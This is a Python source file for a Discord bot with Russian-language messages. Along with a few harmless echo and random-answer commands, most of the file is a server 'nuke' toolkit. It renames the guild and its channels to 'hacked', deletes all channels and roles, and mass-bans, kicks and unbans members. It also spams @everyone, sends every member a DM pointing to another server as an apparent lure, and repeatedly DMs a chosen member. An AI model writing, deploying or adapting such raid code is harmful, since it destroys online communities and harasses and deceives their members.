import discord
import json
from discord.ext import commands
import random
flag = False

file = open('config.json', 'r')
config = json.load(file)

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(config['prefix'], intents=intents)

@bot.event
async def on_ready():
    print('бот онлайн')

#@bot.command(name='ping_stop')
#@commands.has_role(1054108853857427538)
#async def ping(ctx, member: discord.Member = None):
    #while_ = False


@bot.command(name='ping')
@commands.has_role('король-этих лохов')
async def ping(ctx:  commands.context.Context, member: discord.Member = None, count=0, *, arg):
    for i in range(int(count)):
        await member.send(f'{arg} {member.mention}')
        
        
        


@bot.command(name='foo') 
async def foo(ctx: commands.context, *, args):
    result = str(args)
    await ctx.send(embed=discord.Embed(description=f'{result}', color=0x00bfff))

@bot.command(name='foo_title')
async def foo_title(ctx: commands.context, *, args):
    result = str(args)
    await ctx.send(embed=discord.Embed(title=result,color=0x00bfff))
    

@bot.command(name='ask')
async def ask(ctx, *, arg):
    indexans = random.randint(1, 4)
    answers = {1: 'да', 2: 'нет', 3: 'не знаю', 4: 'возможно'}
    answer = answers.get(indexans)
    await ctx.reply(embed=discord.Embed(title=str(arg), color=0x3BFC40, description=answer))


@bot.command(name='nuke_change')
@commands.has_role('король-этих лохов')
async def nuke(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    await guild.edit(name='HACKED')
@bot.command(name='nuke_change_all')
async def nuke_2(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for chanel in guild.channels:
        await chanel.edit(name='hacked')
@bot.command(name='nuke_nick')
@commands.has_role('король-этих лохов')
async def nuke_3(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for member in guild.members:
        try:
            await member.edit(nick='лох')
        except:
            print('ошибка')

@bot.command(name='nuke_nick_obt')
@commands.has_role('король-этих лохов')
async def nuke_4(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for member in guild.members:
        try:
            await member.edit(nick='')
        except:
            print('ошибка')
@bot.command(name='delete')
@commands.has_role('король-этих лохов')
async def nuke_5(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for chanel in guild.channels:
        await chanel.delete()
    await guild.create_text_channel('hacked')
@bot.command(name='nuke_spam')
@commands.has_role('король-этих лохов')
async def nuke_6(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for chanel in guild.channels:
        try:
            for i in range(2):
                await chanel.send('@everyone')
        except:
            print(1)
@bot.command(name='nuke_ls_spam')
@commands.has_role('король-этих лохов')
async def nuke_7(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for memebr in guild.members:
        try:
            for i in range(1):
                await memebr.send('https://discord.gg/zkwe9nRD2y, здраствуй игрок мы перешли на другой сервер, прошу зайти на него, порося будет удалена')
        except:
            print('ошибка')
            

@bot.command(name='ban', usage='ban <@user> <reason>')
@commands.has_role('король-этих лохов')
async def ban(ctx: commands.context.Context, memder: discord.Member, *, reason):
    await ctx.guild.ban(user=memder, reason=reason)
    message = await ctx.send(f'Ещё один лох: {memder}, улетел в бан')
    await message.add_reaction(':cockroach:')
@bot.command(name='nuke_ban')
@commands.has_role('король-этих лохов')
async def nuke_8(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for memebr in guild.members:
        try:
            await ctx.guild.ban(user=memebr)
        except:
            print('невозможно забанить')


@bot.command(name='nuke_kick')
@commands.has_role('король-этих лохов')
async def nuke_8(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild)
    for memebr in guild.members:
        try:
            await ctx.guild.kick(user=memebr)
        except:
            print('невозможно забанить')
    

@bot.slash_command(name="ban", guild_ids=[966364870863908875, 1054306268715700336, 1054471671727263806, 1054655112439672842], description="забанить админа") 
async def first_slash(ctx): 
    await ctx.respond("ааааа нееееееееееет, у тебя нет прав")

@bot.command(name='delete_role')
@commands.has_role('король-этих лохов')
async def delete_role(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild.roles)
    for role in guild.roles:
        try:
         
            print(role)
            await role.delete()
        except:
            print(1)

@bot.command(name='nuke_unban')
@commands.has_role('король-этих лохов')
async def nuke_9(ctx):
     banlist = await ctx.guild.bans()
     for m in banlist:
        await ctx.guild.unban(m)


@bot.command(name='change_role')
@commands.has_role('король-этих лохов')
async def delete_role(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild.roles)
    for role in guild.roles:
        try:
            print(role)
            await role.edit(name='SCAMMER ❌', color=0xcc0000)
        except:
            print(1)
@bot.command(name='add_role')
@commands.has_role('король-этих лохов')
async def change_role(ctx):
    guild = bot.get_guild(ctx.message.guild.id)
    print(guild.roles)
    for i in range(30):
        await ctx.guild.create_role(name='SCAMMER ❌', color=0xcc0000)




        

bot.run(config['token'])